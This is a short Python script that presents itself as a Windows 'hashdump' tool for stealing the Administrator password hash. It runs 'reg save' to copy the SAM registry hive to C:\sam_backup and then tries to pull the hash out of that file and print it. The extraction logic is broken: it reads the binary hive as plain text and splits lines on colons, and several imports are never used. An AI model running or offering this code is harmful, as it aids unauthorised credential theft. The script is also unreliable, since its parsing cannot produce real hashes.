import os
import subprocess
import base64
import sys
import time
import logging
from win32com.shell import shell, shellcon
from colorama import init, Fore

# Colorama initialization
init(autoreset=True)

# Log settings
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

def get_admin_hash():
    """Fetches the admin password hash from Windows SAM database."""
    try:
        # Access SAM file
        print(Fore.YELLOW + "[*] Accessing SAM file...")
        output = subprocess.check_output("reg save HKLM\\SAM C:\\sam_backup /y", shell=True)
        output = output.decode('utf-8')

        # Check if backup is successful
        if 'successfully' in output:
            print(Fore.GREEN + "[+] SAM database successfully backed up.")
        else:
            print(Fore.RED + "[-] Failed to access SAM database.")
            return None

        # Open the file and extract the hashes
        with open('C:\\sam_backup', 'r') as file:
            data = file.readlines()

        hashes = {}
        for line in data:
            if "Administrator" in line:  # You can change the username here
                parts = line.split(":")
                hashes['Administrator'] = parts[1]  # Get the hash part

        if hashes:
            return hashes
        else:
            print(Fore.RED + "[-] No hashes found.")
            return None

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")
        return None


def display_hashes(hashes):
    """Displays the obtained hashes."""
    if hashes:
        for user, hash_value in hashes.items():
            print(Fore.GREEN + f"[+] Hash for {user} user: {hash_value}")
    else:
        print(Fore.RED + "[-] Could not retrieve hash information.")


def main():
    print(Fore.CYAN + "[*] Starting Windows Hashdump...")
    hashes = get_admin_hash()
    display_hashes(hashes)

if __name__ == "__main__":
    main()